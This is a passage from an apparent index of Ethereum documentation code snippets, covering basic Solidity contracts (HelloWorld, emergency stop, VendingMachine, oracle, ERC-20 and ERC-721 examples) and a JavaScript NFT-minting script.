the message and emits an event with both old and new messages.\n\nLANGUAGE: solidity\nCODE:\n```\n// HelloWorld.sol\n\n// Specifies the version of Solidity, using semantic versioning.\n// Learn more: https://solidity.readthedocs.io/en/v0.5.10/layout-of-source-files.html#pragma\npragma solidity ^0.7.3;\n\n// Defines a contract named `HelloWorld`.\n// A contract is a collection of functions and data (its state). Once deployed, a contract resides at a specific address on the Ethereum blockchain. Learn more: https://solidity.readthedocs.io/en/v0.5.10/structure-of-a-contract.html\ncontract HelloWorld {\n\n   //Emitted when update function is called\n   //Smart contract events are a way for your contract to communicate that something happened on the blockchain to your app front-end, which can be 'listening' for certain events and take action when they happen.\n   event UpdatedMessages(string oldStr, string newStr);\n\n   // Declares a state variable `message` of type `string`.\n   // State variables are variables whose values are permanently stored in contract storage. The keyword `public` makes variables accessible from outside a contract and creates a function that other contracts or clients can call to access the value.\n   string public message;\n\n   // Similar to many class-based object-oriented languages, a constructor is a special function that is only executed upon contract creation.\n   // Constructors are used to initialize the contract's data. Learn more:https://solidity.readthedocs.io/en/v0.5.10/contracts.html#constructors\n   constructor(string memory initMessage) {\n\n      // Accepts a string argument `initMessage` and sets the value into the contract's `message` storage variable).\n      message = initMessage;\n   }\n\n   // A public function that accepts a string argument and updates the `message` storage variable.\n   function update(string memory newMessage) public {\n      string memory oldMsg = message;\n      message = newMessage;\n      emit UpdatedMessages(oldMsg, newMessage);\n   }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Emergency Stop Pattern in Solidity\nDESCRIPTION: A basic implementation of the emergency stop (circuit breaker) pattern in Solidity. This pattern allows contract owners to pause sensitive contract functionality when vulnerabilities are discovered. It uses boolean flags and modifiers to control function execution based on the contract's operational state.\n\nLANGUAGE: solidity\nCODE:\n```\n// This code has not been professionally audited and makes no promises about safety or correctness. Use at your own risk.\n\ncontract EmergencyStop {\n\n    bool isStopped = false;\n\n    modifier stoppedInEmergency {\n        require(!isStopped);\n        _;\n    }\n\n    modifier onlyWhenStopped {\n        require(isStopped);\n        _;\n    }\n\n    modifier onlyAuthorized {\n        // Check for authorization of msg.sender here\n        _;\n    }\n\n    function stopContract() public onlyAuthorized {\n        isStopped = true;\n    }\n\n    function resumeContract() public onlyAuthorized {\n        isStopped = false;\n    }\n\n    function deposit() public payable stoppedInEmergency {\n        // Deposit logic happening here\n    }\n\n    function emergencyWithdraw() public onlyWhenStopped {\n        // Emergency withdraw happening here\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Error Handling in Solidity Smart Contracts\nDESCRIPTION: This code demonstrates a VendingMachine contract that uses revert() statements for defensive programming. It includes error handling for insufficient funds during purchases and unauthorized access for withdrawals, showing proper implementation of access controls.\n\nLANGUAGE: solidity\nCODE:\n```\npragma solidity ^0.8.4;\n\ncontract VendingMachine {\n    address owner;\n    error Unauthorized();\n    function buy(uint amount) public payable {\n        if (amount > msg.value / 2 ether)\n            revert(\"Not enough Ether provided.\");\n        // Perform the purchase.\n    }\n    function withdraw() public {\n        if (msg.sender != owner)\n            revert Unauthorized();\n\n        payable(msg.sender).transfer(address(this).balance);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: ERC-20 Token Contract ABI in JSON Format\nDESCRIPTION: The Application Binary Interface (ABI) for an ERC-20 token contract in JSON format. This file defines the interface that web applications can use to interact with the smart contract, including functions like transfer, approve, and balanceOf.\n\nLANGUAGE: json\nCODE:\n```\n[\n  {\n    \"constant\": true,\n    \"inputs\": [],\n    \"name\": \"name\",\n    \"outputs\": [\n      {\n        \"name\": \"\",\n        \"type\": \"string\"\n      }\n    ],\n    \"payable\": false,\n    \"stateMutability\": \"view\",\n    \"type\": \"function\"\n  },\n  {\n    \"constant\": false,\n    \"inputs\": [\n      {\n        \"name\": \"_spender\",\n        \"type\": \"address\"\n      },\n      {\n        \"name\": \"_value\",\n        \"type\": \"uint256\"\n      }\n    ],\n    \"name\": \"approve\",\n    \"outputs\": [\n      {\n        \"name\": \"\",\n        \"type\": \"bool\"\n      }\n    ],\n    \"payable\": false,\n    \"stateMutability\": \"nonpayable\",\n    \"type\": \"function\"\n  },\n  {\n    \"constant\": true,\n    \"inputs\": [],\n    \"name\": \"totalSupply\",\n    \"outputs\": [\n      {\n        \"name\": \"\",\n        \"type\": \"uint256\"\n      }\n    ],\n    \"payable\": false,\n    \"stateMutability\": \"view\",\n    \"type\": \"function\"\n  },\n  {\n    \"constant\": false,\n    \"inputs\": [\n      {\n        \"name\": \"_from\",\n        \"type\": \"address\"\n      },\n      {\n        \"name\": \"_to\",\n        \"type\": \"address\"\n      },\n      {\n        \"name\": \"_value\",\n        \"type\": \"uint256\"\n      }\n    ],\n    \"name\": \"transferFrom\",\n    \"outputs\": [\n      {\n        \"name\": \"\",\n        \"type\": \"bool\"\n      }\n    ],\n    \"payable\": false,\n    \"stateMutability\": \"nonpayable\",\n    \"type\": \"function\"\n  },\n  {\n    \"constant\": true,\n    \"inputs\": [],\n    \"name\": \"decimals\",\n    \"outputs\": [\n      {\n        \"name\": \"\",\n        \"type\": \"uint8\"\n      }\n    ],\n    \"payable\": false,\n    \"stateMutability\": \"view\",\n    \"type\": \"function\"\n  },\n  {\n    \"constant\": true,\n    \"inputs\": [\n      {\n        \"name\": \"_owner\",\n        \"type\": \"address\"\n      }\n    ],\n    \"name\": \"balanceOf\",\n    \"outputs\": [\n      {\n        \"name\": \"balance\",\n        \"type\": \"uint256\"\n      }\n    ],\n    \"payable\": false,\n    \"stateMutability\": \"view\",\n    \"type\": \"function\"\n  },\n  {\n    \"constant\": true,\n    \"inputs\": [],\n    \"name\": \"symbol\",\n    \"outputs\": [\n      {\n        \"name\": \"\",\n        \"type\": \"string\"\n      }\n    ],\n    \"payable\": false,\n    \"stateMutability\": \"view\",\n    \"type\": \"function\"\n  },\n  {\n    \"constant\": false,\n    \"inputs\": [\n      {\n        \"name\": \"_to\",\n        \"type\": \"address\"\n      },\n      {\n        \"name\": \"_value\",\n        \"type\": \"uint256\"\n      }\n    ],\n    \"name\": \"transfer\",\n    \"outputs\": [\n      {\n        \"name\": \"\",\n        \"type\": \"bool\"\n      }\n    ],\n    \"payable\": false,\n    \"stateMutability\": \"nonpayable\",\n    \"type\": \"function\"\n  },\n  {\n    \"constant\": true,\n    \"inputs\": [\n      {\n        \"name\": \"_owner\",\n        \"type\": \"address\"\n      },\n      {\n        \"name\": \"_spender\",\n        \"type\": \"address\"\n      }\n    ],\n    \"name\": \"allowance\",\n    \"outputs\": [\n      {\n        \"name\": \"\",\n        \"type\": \"uint256\"\n      }\n    ],\n    \"payable\": false,\n    \"stateMutability\": \"view\",\n    \"type\": \"function\"\n  },\n  {\n    \"payable\": true,\n    \"stateMutability\": \"payable\",\n    \"type\": \"fallback\"\n  },\n  {\n    \"anonymous\": false,\n    \"inputs\": [\n      {\n        \"indexed\": true,\n        \"name\": \"owner\",\n        \"type\": \"address\"\n      },\n      {\n        \"indexed\": true,\n        \"name\": \"spender\",\n        \"type\": \"address\"\n      },\n      {\n        \"indexed\": false,\n        \"name\": \"value\",\n        \"type\": \"uint256\"\n      }\n    ],\n    \"name\": \"Approval\",\n    \"type\": \"event\"\n  },\n  {\n    \"anonymous\": false,\n    \"inputs\": [\n      {\n        \"indexed\": true,\n        \"name\": \"from\",\n        \"type\": \"address\"\n      },\n      {\n        \"indexed\": true,\n        \"name\": \"to\",\n        \"type\": \"address\"\n      },\n      {\n        \"indexed\": false,\n        \"name\": \"value\",\n        \"type\": \"uint256\"\n      }\n    ],\n    \"name\": \"Transfer\",\n    \"type\": \"event\"\n  }\n]\n```\n\n----------------------------------------\n\nTITLE: Defining the ERC-20 Interface in Solidity\nDESCRIPTION: This code defines the IERC20 interface which specifies the required functions and events that any ERC-20 compliant token must implement. It includes getter functions for totalSupply, balanceOf, and allowance, plus functions for transfer, approve, and transferFrom operations, along with Transfer and Approval events.\n\nLANGUAGE: solidity\nCODE:\n```\npragma solidity ^0.6.0;\n\ninterface IERC20 {\n\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Error Handling in Solidity Smart Contracts\nDESCRIPTION: This code demonstrates a VendingMachine contract that uses revert() statements for defensive programming. It includes error handling for insufficient funds during purchases and unauthorized access for withdrawals, showing proper implementation of access controls.\n\nLANGUAGE: solidity\nCODE:\n```\npragma solidity ^0.8.4;\n\ncontract VendingMachine {\n    address owner;\n    error Unauthorized();\n    function buy(uint amount) public payable {\n        if (amount > msg.value / 2 ether)\n            revert(\"Not enough Ether provided.\");\n        // Perform the purchase.\n    }\n    function withdraw() public {\n        if (msg.sender != owner)\n            revert Unauthorized();\n\n        payable(msg.sender).transfer(address(this).balance);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Project Structure for Smart Contract Development\nDESCRIPTION: Commands to create the necessary directories for organizing smart contract code and deployment scripts in the project.\n\nLANGUAGE: bash\nCODE:\n```\nmkdir contracts\nmkdir scripts\n```\n\n----------------------------------------\n\nTITLE: Implementing a Request-Response Oracle Contract in Solidity\nDESCRIPTION: This Solidity contract implements a request-response oracle that can query offchain APIs upon request from other smart contracts. It includes functionality for creating data requests, processing responses from multiple oracle nodes, and establishing consensus on the final result.\n\nLANGUAGE: solidity\nCODE:\n```\npragma solidity >=0.4.21 <0.6.0;\n\ncontract Oracle {\n  Request[] requests; //list of requests made to the contract\n  uint currentId = 0; //increasing request id\n  uint minQuorum = 2; //minimum number of responses to receive before declaring final result\n  uint totalOracleCount = 3; // Hardcoded oracle count\n\n  // defines a general api request\n  struct Request {\n    uint id;                            //request id\n    string urlToQuery;                  //API url\n    string attributeToFetch;            //json attribute (key) to retrieve in the response\n    string agreedValue;                 //value from key\n    mapping(uint => string) answers;     //answers provided by the oracles\n    mapping(address => uint) quorum;    //oracles which will query the answer (1=oracle hasn't voted, 2=oracle has voted)\n  }\n\n  //event that triggers oracle outside of the blockchain\n  event NewRequest (\n    uint id,\n    string urlToQuery,\n    string attributeToFetch\n  );\n\n  //triggered when there's a consensus on the final result\n  event UpdatedRequest (\n    uint id,\n    string urlToQuery,\n    string attributeToFetch,\n    string agreedValue\n  );\n\n  function createRequest (\n    string memory _urlToQuery,\n    string memory _attributeToFetch\n  )\n  public\n  {\n    uint length = requests.push(Request(currentId, _urlToQuery, _attributeToFetch, \"\"));\n    Request storage r = requests[length-1];\n\n    // Hardcoded oracles address\n    r.quorum[address(0x6c2339b46F41a06f09CA0051ddAD54D1e582bA77)] = 1;\n    r.quorum[address(0xb5346CF224c02186606e5f89EACC21eC25398077)] = 1;\n    r.quorum[address(0xa2997F1CA363D11a0a35bB1Ac0Ff7849bc13e914)] = 1;\n\n    // launch an event to be detected by oracle outside of blockchain\n    emit NewRequest (\n      currentId,\n      _urlToQuery,\n      _attributeToFetch\n    );\n\n    // increase request id\n    currentId++;\n  }\n\n  //called by the oracle to record its answer\n  function updateRequest (\n    uint _id,\n    string memory _valueRetrieved\n  ) public {\n\n    Request storage currRequest = requests[_id];\n\n    //check if oracle is in the list of trusted oracles\n    //and if the oracle hasn't voted yet\n    if(currRequest.quorum[address(msg.sender)] == 1){\n\n      //marking that this address has voted\n      currRequest.quorum[msg.sender] = 2;\n\n      //iterate through \"array\" of answers until a position if free and save the retrieved value\n      uint tmpI = 0;\n      bool found = false;\n      while(!found) {\n        //find first empty slot\n        if(bytes(currRequest.answers[tmpI]).length == 0){\n          found = true;\n          currRequest.answers[tmpI] = _valueRetrieved;\n        }\n        tmpI++;\n      }\n\n      uint currentQuorum = 0;\n\n      //iterate through oracle list and check if enough oracles(minimum quorum)\n      //have voted the same answer as the current one\n      for(uint i = 0; i < totalOracleCount; i++){\n        bytes memory a = bytes(currRequest.answers[i]);\n        bytes memory b = bytes(_valueRetrieved);\n\n        if(keccak256(a) == keccak256(b)){\n          currentQuorum++;\n          if(currentQuorum >= minQuorum){\n            currRequest.agreedValue = _valueRetrieved;\n            emit UpdatedRequest (\n              currRequest.id,\n              currRequest.urlToQuery,\n              currRequest.attributeToFetch,\n              currRequest.agreedValue\n            );\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing ERC721 NFT Contract for CryptoPizza in Solidity\nDESCRIPTION: A complete Solidity smart contract implementing the ERC721 standard for non-fungible tokens. The contract creates unique digital assets (pizzas) with random DNA, allows ownership transfer, tracks token ownership, and implements all required ERC721 interface functions. It inherits from OpenZeppelin contracts for security and standard compliance.\n\nLANGUAGE: solidity\nCODE:\n```\npragma solidity ^0.5.10;\n\n// Imports symbols from other files into the current contract.\n// In this case, a series of helper contracts from OpenZeppelin.\n// Learn more: https://solidity.readthedocs.io/en/v0.5.10/layout-of-source-files.html#importing-other-source-files\n\nimport \"../node_modules/@openzeppelin/contracts/token/ERC721/IERC721.sol\";\nimport \"../node_modules/@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol\";\nimport \"../node_modules/@openzeppelin/contracts/introspection/ERC165.sol\";\nimport \"../node_modules/@openzeppelin/contracts/math/SafeMath.sol\";\n\n// The `is` keyword is used to inherit functions and keywords from external contracts.\n// In this case, `CryptoPizza` inherits from the `IERC721` and `ERC165` contracts.\n// Learn more: https://solidity.readthedocs.io/en/v0.5.10/contracts.html#inheritance\ncontract CryptoPizza is IERC721, ERC165 {\n    // Uses OpenZeppelin's SafeMath library to perform arithmetic operations safely.\n    // Learn more: https://docs.openzeppelin.com/contracts/2.x/api/math#SafeMath\n    using SafeMath for uint256;\n\n    // Constant state variables in Solidity are similar to other languages\n    // but you must assign from an expression which is constant at compile time.\n    // Learn more: https://solidity.readthedocs.io/en/v0.5.10/contracts.html#constant-state-variables\n    uint256 constant dnaDigits = 10;\n    uint256 constant dnaModulus = 10 ** dnaDigits;\n    bytes4 private constant _ERC721_RECEIVED = 0x150b7a02;\n\n    // Struct types let you define your own type\n    // Learn more: https://solidity.readthedocs.io/en/v0.5.10/types.html#structs\n    struct Pizza {\n        string name;\n        uint256 dna;\n    }\n\n    // Creates an empty array of Pizza structs\n    Pizza[] public pizzas;\n\n    // Mapping from pizza ID to its owner's address\n    mapping(uint256 => address) public pizzaToOwner;\n\n    // Mapping from owner's address to number of owned token\n    mapping(address => uint256) public ownerPizzaCount;\n\n    // Mapping from token ID to approved address\n    mapping(uint256 => address) pizzaApprovals;\n\n    // You can nest mappings, this example maps owner to operator approvals\n    mapping(address => mapping(address => bool)) private operatorApprovals;\n\n    // Internal function to create a random Pizza from string (name) and DNA\n    function _createPizza(string memory _name, uint256 _dna)\n        // The `internal` keyword means this function is only visible\n        // within this contract and contracts that derive this contract\n        // Learn more: https://solidity.readthedocs.io/en/v0.5.10/contracts.html#visibility-and-getters\n        internal\n        // `isUnique` is a function modifier that checks if the pizza already exists\n        // Learn more: https://solidity.readthedocs.io/en/v0.5.10/structure-of-a-contract.html#function-modifiers\n        isUnique(_name, _dna)\n    {\n        // Adds Pizza to array of Pizzas and get id\n        uint256 id = SafeMath.sub(pizzas.push(Pizza(_name, _dna)), 1);\n\n        // Checks that Pizza owner is the same as current user\n        // Learn more: https://solidity.readthedocs.io/en/v0.5.10/control-structures.html#error-handling-assert-require-revert-and-exceptions\n\n        // note that address(0) is the zero address,\n        // indicating that pizza[id] is not yet allocated to a particular user.\n\n        assert(pizzaToOwner[id] == address(0));\n\n        // Maps the Pizza to the owner\n        pizzaToOwner[id] = msg.sender;\n        ownerPizzaCount[msg.sender] = SafeMath.add(\n            ownerPizzaCount[msg.sender],\n            1\n        );\n    }\n\n    // Creates a random Pizza from string (name)\n    function createRandomPizza(string memory _name) public {\n        uint256 randDna = generateRandomDna(_name, msg.sender);\n        _createPizza(_name, randDna);\n    }\n\n    // Generates random DNA from string (name) and address of the owner (creator)\n    function generateRandomDna(string memory _str, address _owner)\n        public\n        // Functions marked as `pure` promise not to read from or modify the state\n        // Learn more: https://solidity.readthedocs.io/en/v0.5.10/contracts.html#pure-functions\n        pure\n        returns (uint256)\n    {\n        // Generates random uint from string (name) + address (owner)\n        uint256 rand = uint256(keccak256(abi.encodePacked(_str))) +\n            uint256(_owner);\n        rand = rand % dnaModulus;\n        return rand;\n    }\n\n    // Returns array of Pizzas found by owner\n    function getPizzasByOwner(address _owner)\n        public\n        // Functions marked as `view` promise not to modify state\n        // Learn more: https://solidity.readthedocs.io/en/v0.5.10/contracts.html#view-functions\n        view\n        returns (uint256[] memory)\n    {\n        // Uses the `memory` storage location to store values only for the\n        // lifecycle of this function call.\n        // Learn more: https://solidity.readthedocs.io/en/v0.5.10/introduction-to-smart-contracts.html#storage-memory-and-the-stack\n        uint256[] memory result = new uint256[](ownerPizzaCount[_owner]);\n        uint256 counter = 0;\n        for (uint256 i = 0; i < pizzas.length; i++) {\n            if (pizzaToOwner[i] == _owner) {\n                result[counter] = i;\n                counter++;\n            }\n        }\n        return result;\n    }\n\n    // Transfers Pizza and ownership to other address\n    function transferFrom(address _from, address _to, uint256 _pizzaId) public {\n        require(_from != address(0) && _to != address(0), \"Invalid address.\");\n        require(_exists(_pizzaId), \"Pizza does not exist.\");\n        require(_from != _to, \"Cannot transfer to the same address.\");\n        require(_isApprovedOrOwner(msg.sender, _pizzaId), \"Address is not approved.\");\n\n        ownerPizzaCount[_to] = SafeMath.add(ownerPizzaCount[_to], 1);\n        ownerPizzaCount[_from] = SafeMath.sub(ownerPizzaCount[_from], 1);\n        pizzaToOwner[_pizzaId] = _to;\n\n        // Emits event defined in the imported IERC721 contract\n        emit Transfer(_from, _to, _pizzaId);\n        _clearApproval(_to, _pizzaId);\n    }\n\n    /**\n     * Safely transfers the ownership of a given token ID to another address\n     * If the target address is a contract, it must implement `onERC721Received`,\n     * which is called upon a safe transfer, and return the magic value\n     * `bytes4(keccak256(\"onERC721Received(address,address,uint256,bytes)\")))`;  \n     * otherwise, the transfer is reverted.\n    */\n    function safeTransferFrom(address from, address to, uint256 pizzaId)\n        public\n    {\n        // solium-disable-next-line arg-overflow\n        this.safeTransferFrom(from, to, pizzaId, \"\");\n    }\n\n    /**\n     * Safely transfers the ownership of a given token ID to another address\n     * If the target address is a contract, it must implement `onERC721Received`,\n     * which is called upon a safe transfer, and return the magic value\n     * `bytes4(keccak256(\"onERC721Received(address,address,uint256,bytes)\")))`;    \n     * otherwise, the transfer is reverted.\n     */\n    function safeTransferFrom(\n        address from,\n        address to,\n        uint256 pizzaId,\n        bytes memory _data\n    ) public {\n        this.transferFrom(from, to, pizzaId);\n        require(_checkOnERC721Received(from, to, pizzaId, _data), \"Must implement onERC721Received.\");\n    }\n\n    /**\n     * Internal function to invoke `onERC721Received` on a target address\n     * The call is not executed if the target address is not a contract\n     */\n    function _checkOnERC721Received(\n        address from,\n        address to,\n        uint256 pizzaId,\n        bytes memory _data\n    ) internal returns (bool) {\n        if (!isContract(to)) {\n            return true;\n        }\n\n        bytes4 retval = IERC721Receiver(to).onERC721Received(\n            msg.sender,\n            from,\n            pizzaId,\n            _data\n        );\n        return (retval == _ERC721_RECEIVED);\n    }\n\n    // Burns a Pizza - destroys Token completely\n    // The `external` function modifier means this function is\n    // part of the contract interface and other contracts can call it\n    function burn(uint256 _pizzaId) external {\n        require(msg.sender != address(0), \"Invalid address.\");\n        require(_exists(_pizzaId), \"Pizza does not exist.\");\n        require(_isApprovedOrOwner(msg.sender, _pizzaId), \"Address is not approved.\");\n\n        ownerPizzaCount[msg.sender] = SafeMath.sub(\n            ownerPizzaCount[msg.sender],\n            1\n        );\n        pizzaToOwner[_pizzaId] = address(0);\n    }\n\n    // Returns count of Pizzas by address\n    function balanceOf(address _owner) public view returns (uint256 _balance) {\n        return ownerPizzaCount[_owner];\n    }\n\n    // Returns owner of the Pizza found by id\n    function ownerOf(uint256 _pizzaId) public view returns (address _owner) {\n        address owner = pizzaToOwner[_pizzaId];\n        require(owner != address(0), \"Invalid Pizza ID.\");\n        return owner;\n    }\n\n    // Approves other address to transfer ownership of Pizza\n    function approve(address _to, uint256 _pizzaId) public {\n        require(msg.sender == pizzaToOwner[_pizzaId], \"Must be the Pizza owner.\");\n        pizzaApprovals[_pizzaId] = _to;\n        emit Approval(msg.sender, _to, _pizzaId);\n    }\n\n    // Returns approved address for specific Pizza\n    function getApproved(uint256 _pizzaId)\n        public\n        view\n        returns (address operator)\n    {\n        require(_exists(_pizzaId), \"Pizza does not exist.\");\n        return pizzaApprovals[_pizzaId];\n    }\n\n    /**\n     * Private function to clear current approval of a given token ID\n     * Reverts if the given address is not indeed the owner of the token\n     */\n    function _clearApproval(address owner, uint256 _pizzaId) private {\n        require(pizzaToOwner[_pizzaId] == owner, \"Must be pizza owner.\");\n        require(_exists(_pizzaId), \"Pizza does not exist.\");\n\n```\n\n----------------------------------------\n\nTITLE: ERC-20 totalSupply Function Definition\nDESCRIPTION: Defines the totalSupply function that returns the total amount of tokens in existence. This is an external view function that doesn't modify state and returns a uint256.\n\nLANGUAGE: solidity\nCODE:\n```\n    /**\n     * @dev Returns the amount of tokens in existence.\n     */\n    function totalSupply() external view returns (uint256);\n```\n\n----------------------------------------\n\nTITLE: Creating a Basic HelloWorld Smart Contract in Solidity\nDESCRIPTION: A simple Solidity smart contract that stores a message which can be updated. It includes a constructor that initializes the message and an update function to change it.\n\nLANGUAGE: solidity\nCODE:\n```\n// Especifica a versão do Solidity usando a versão semântica.\n// Learn more: https://solidity.readthedocs.io/en/v0.5.10/layout-of-source-files.html#pragma\npragma solidity ^0.7.0;\n\n// Defines a contract named `HelloWorld`.\n// Um contrato é uma coleção de funções e dados (seu estado). Uma vez implantado, um contrato reside em um endereço específico na blockchain Ethereum. Learn more: https://solidity.readthedocs.io/en/v0.5.10/structure-of-a-contract.html\ncontract HelloWorld {\n\n   // Declares a state variable `message` of type `string`.\n   // Variáveis de estado são variáveis cujos valores são permanentemente armazenados no armazenamento do contrato. The keyword `public` makes variables accessible from outside a contract and creates a function that other contracts or clients can call to access the value.\n   string public message;\n\n   // Similar to many class-based object-oriented languages, a constructor is a special function that is only executed upon contract creation.\n   // Os construtores são usados para inicializar os dados do contrato. Learn more:https://solidity.readthedocs.io/en/v0.5.10/contracts.html#constructors\n   constructor(string memory initMessage) {\n\n      // Accepts a string argument `initMessage` and sets the value into the contract's `message` storage variable).\n      message = initMessage;\n   }\n\n   // A public function that accepts a string argument and updates the `message` storage variable.\n   function update(string memory newMessage) public {\n      message = newMessage;\n   }\n}\n```\n\n----------------------------------------\n\nTITLE: Complete NFT Minting Implementation with Ethereum and IPFS\nDESCRIPTION: A complete implementation of NFT minting functionality that connects to Ethereum via Alchemy API. This script initializes the web3 instance, creates a contract instance, defines the minting function, and calls it with an IPFS URI pointing to the NFT metadata.\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"dotenv\").config()\nconst API_URL = process.env.API_URL\nconst PUBLIC_KEY = process.env.PUBLIC_KEY\nconst PRIVATE_KEY = process.env.PRIVATE_KEY\n\nconst { createAlchemyWeb3 } = require(\"@alch/alchemy-web3\")\nconst web3 = createAlchemyWeb3(API_URL)\n\nconst contract = require(\"../artifacts/contracts/MyNFT.sol/MyNFT.json\")\nconst contractAddress = \"0x5a738a5c5fe46a1fd5ee7dd7e38f722e2aef7778\"\nconst nftContract = new web3.eth.Contract(contract.abi, contractAddress)\n\nasync function mintNFT(tokenURI) {\n  const nonce = await web3.eth.getTransactionCount(PUBLIC_KEY, \"latest\") //get latest nonce\n\n  //the transaction\n  const tx = {\n    from: PUBLIC_KEY,\n    to: contractAddress,\n    nonce: nonce,\n    gas: 500000,\n    data: nftContract.methods.mintNFT(PUBLIC_KEY, tokenURI).encodeABI(),\n  }\n\n  const signPromise = web3.eth.accounts.signTransaction(tx, PRIVATE_KEY)\n  signPromise\n    .then((signedTx) => {\n      web3.eth.sendSignedTransaction(\n        signedTx.rawTransaction,\n        function (err, hash) {\n          if (!err) {\n            console.log(\n              \"The hash of your transaction is: \",\n              hash,\n              \"\\nCheck Alchemy's Mempool to view the status of your transaction!\"\n            )\n          } else {\n            console.log(\n              \"Something went wrong when submitting your transaction:\",\n              err\n            )\n          }\n        }\n      )\n    })\n    .catch((err) => {\n      console.log(\"Promise failed:\", err)\n    })\n}\n\nmintNFT(\"ipfs://QmYueiuRNmL4MiA2GwtVMm6ZagknXnSpQnB3z2gWbz36hP\")\n```\n\n----------------------------------------\n\nTITLE: Calculating Output Amount with Exchange Fee\nDESCRIPTION: Calculates the maximum output amount of a token after accounting for the 0.3% exchange fee. This function handles the mathematical conversion that incorporates the fee into the exchange rate calculation.\n\nLANGUAGE: solidity\nCODE:\n```\n    // given an input amount of an asset and pair reserves, returns the maximum output amount of the other asset\n    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) internal pure returns (uint amountOut) {\n        require(amountIn > 0, 'UniswapV2Library: INSUFFICIENT_INPUT_AMOUNT');\n        require(reserveIn > 0 && reserveOut > 0, 'UniswapV2Library: INSUFFICIENT_LIQUIDITY');\n        uint amountInWithFee = amountIn.mul(997);\n        uint numerator = amountInWithFee.mul(reserveOut);\n        uint denominator = reserveIn.mul(1000).add(amountInWithFee);\n        amountOut = numerator / denominator;\n    }\n```\n\n----------------------------------------\n\nTITLE: ERC-20 totalSupply Function Definition\nDESCRIPTION: Defines the totalSupply function that returns the total amount of tokens in existence. This is an external view function that doesn't modify state and returns a uint256.\n\nLANGUAGE: solidity\nCODE:\n```\n    /**\n     * @dev Returns the amount of tokens in existence.\n     */\n    function totalSupply() external view returns (uint256);\n```\n\n----------------------------------------\n\nTITLE: Implementing ERC20 Approve Function in Solidity\nDESCRIPTION: This function allows token holders to give permission to another address to spend a specified amount of tokens on their behalf. It returns true if successful or reverts if conditions are not met.\n\nLANGUAGE: solidity\nCODE:\n```\n    /**\n     * @dev See {IERC20-approve}.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n```\n\n----------------------------------------\n\nTITLE: Documenting ERC20 Interface with NatSpec\nDESCRIPTION: Uses NatSpec format to document the ERC-20 interface, which helps in generating external documentation. This comment provides context about the code that follows.\n\nLANGUAGE: solidity\nCODE:\n```\n/**\n * @dev Interface of the ERC20 standard as defined in the EIP.\n */\n```\n\n----------------------------------------\n\nTITLE: Defining Freeze/Thaw Events in Solidity\nDESCRIPTION: Event declarations that will be emitted when accounts are frozen or thawed. These events are indexed to allow external systems to track when accounts are frozen or unfrozen.\n\nLANGUAGE: solidity\nCODE:\n```\n// When accounts are frozen or unfrozen\nevent AccountFrozen(address indexed _addr);\nevent AccountThawed(address indexed _addr);\n```\n\n----------------------------------------\n\nTITLE: ERC-20 transferFrom Function Definition\nDESCRIPTION: Defines the transferFrom function that allows a spender to transfer tokens from an approved address. Used with the allowance mechanism and emits a Transfer event.\n\nLANGUAGE: solidity\nCODE:\n```\n    /**\n     * @dev Moves `amount` tokens from `sender` to `recipient` using the\n     * allowance mechanism. `amount` is then deducted from the caller's\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n```\n\n----------------------------------------\n\nTITLE: Installing Alchemy Web3 Library for Ethereum Transactions\nDESCRIPTION: NPM command to install the Alchemy Web3 library, which is a wrapper around standard JSON-RPC calls used for Ethereum development.\n\nLANGUAGE: Bash\nCODE:\n```\nnpm install @alch/alchemy-web3\n```\n\n----------------------------------------\n\nTITLE: Complete Example Dapp Contract in Solidity\nDESCRIPTION: A complete example of a simple Solidity contract with a constructor, getter and setter functions. This demonstrates the basic structure of a smart contract with state manipulation.\n\nLANGUAGE: solidity\nCODE:\n```\npragma solidity >=0.4.0 <=0.6.0;\n\ncontract ExampleDapp {\n    string dapp_name; // state variable\n\n    // Called when the contract is deployed and initializes the value\n    constructor() public {\n        dapp_name = \"My Example dapp\";\n    }\n\n    // Get Function\n    function read_name() public view returns(string) {\n        return dapp_name;\n    }\n\n    // Set Function\n    function update_name(string value) public {\n        dapp_name = value;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Installing Alchemy Web3 Library for Ethereum Transactions\nDESCRIPTION: NPM command to install the Alchemy Web3 library, which is a wrapper around standard JSON-RPC calls used for Ethereum development.\n\nLANGUAGE: Bash\nCODE:\n```\nnpm install @alch/alchemy-web3\n```\n\n----------------------------------------\n\nTITLE: Implementing EIP-1271 Interface in Solidity\nDESCRIPTION: The standard EIP-1271 interface that defines the isValidSignature function. This interface requires implementing a function that validates a signature against a message hash and returns a specific magic value when the signature is valid.\n\nLANGUAGE: solidity\nCODE:\n```\npragma solidity ^0.5.0;\n\ncontract ERC1271 {\n\n  // bytes4(keccak256(\"isValidSignature(bytes32,bytes)\")\n  bytes4 constant internal MAGICVALUE = 0x1626ba7e;\n\n  /**\n   * @dev Should return whether the signature provided is valid for the provided hash\n   * @param _hash      Hash of the data to be signed\n   * @param _signature Signature byte array associated with _hash\n   *\n   * MUST return the bytes4 magic value 0x1626ba7e when function passes.\n   * MUST NOT modify state (using STATICCALL for solc < 0.5, view modifier for solc > 0.5)\n   * MUST allow external calls\n   */\n  function isValidSignature(\n    bytes32 _hash,\n    bytes memory _signature)\n    public\n    view\n    returns (bytes4 magicValue);\n}\n```\n\n----------------------------------------\n\nTITLE: Finalizing ERC-20 Token Withdrawal from L2 to L1 in Ethereum Bridge\nDESCRIPTION: This function finalizes ERC-20 token 